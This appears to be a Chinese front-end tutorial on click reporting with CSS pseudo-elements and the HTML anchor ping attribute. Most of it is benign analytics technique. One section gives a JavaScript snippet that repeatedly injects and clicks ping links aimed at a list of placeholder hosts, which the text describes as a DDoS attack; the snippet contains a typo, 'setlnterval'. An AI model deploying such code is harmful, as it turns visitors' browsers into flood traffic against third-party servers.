# 借助HTML ping属性实现数据上报
## CSS上报
``` 
.button-1:active::after {
    content: url(./pixel.gif?action=click&id=button1);
    display: none;
}
.button-2:active::after {
    content: url(./pixel.gif?action=click&id=button2);
    display: none;
}
```
使用CSS变量优化
``` 
.report:active::after {
    content: var(--report);
    display: inline-block;
    position: absolute;
}
```
设置了类名 .report 的元素按下的时候都会上报，例如：
``` 
<button class="report" style="--report:url(./pixel.gif?action=click&id=button1)">按钮1</button>
<button class="report" style="--report:url(./pixel.gif?action=click&id=button2)" >按钮2</button>
```
## ping属性与数据上报
a链接元素，只要设置了 ping 属性，用户点击此链接元素的时候，浏览器就会自动发送一个 POST 请求给 ping 属性值地址。  
``` 
<a href ping="/pixel.gif?action=click&id=link1">链接1</a>
<a href ping="/pixel.gif?action=click&id=link2">链接2</a>
```
点击“链接1”和“链接2”，浏览器就会给服务器 POST '/pixel.gif...'这个地址。  
 ping 请求的 content-type 是 text/ping，包含了用户的 User-Agent，是否跨域，目标来源地址等信息，非常方便数据收集的时候进行追踪。
## ping属性的优势
使用 ping 属性实现数据上报的优点：
- 无需 JavaScript 代码参与，网页功能异常也能上报；
- 不受浏览器刷新、跳转过关闭影响，也不会阻塞页面后续行为，这一点和 navigator.sendBeacon() 类似，可以保证数据上报的准确性；
- 支持跨域；
- 可上报大量数据，因为是 POST 请求
- 语义明确，使用方便，灵活自主
## ping属性的劣势
- 只能支持点击行为的上报，如果是进入视区，或弹框显示的上报，需要额外触发下元素的 click() 行为；
- 只能支持 <a> 元素，在其他元素上设置 ping 属性没有作用，这就限制了其使用范围，
- 只能是 POST 请求，目前主流的数据统计还是日志中的 GET 请求，不能复用现有的基建。
- 适合在移动端项目使用，PC端需要酌情使用（不需要考虑上报总量的情况下），因为目前 IE 和 Firefox 浏览器都不支持（或没有默认开启支持）。
## ping属性与DDoS攻击
``` 
var arr = ['https://www.exampe1.com', 'https://www.exampe2.com', 'https://www.exampe3.com'];
function yzk( ){
    var indexarr = Math.floor((Math.random( )*arr.length));
    document.writeln("<script>var link = document.createElement(\'a\');link.href=\'\';link.ping=\'"+
        arr[indexarr] +
    "\';document.head.appendChild(link); link.click();</script>");
}

if(arr.length>0){
    var ytimename = setlnterval("yzk()", 1000);
}
```
创建一个a元素，设置 ping 地址，触发此链接元素的 click() 事件，此时就可以对目标服务器发动请求攻击了，不停地定时请求攻击。
## 场景
ping 属性上报尤其独到之处，可以用到需要精确知道数据，但是不需要那么广泛或大规模的场景。如果是复杂的大规模的系统上报，则 ping 属性方法并不合适，还是使用传统的 JavaScript 发送请求的方式吧。

参考:
[借助HTML ping属性实现数据上报](https://www.zhangxinxu.com/wordpress/2021/09/html-ping/)
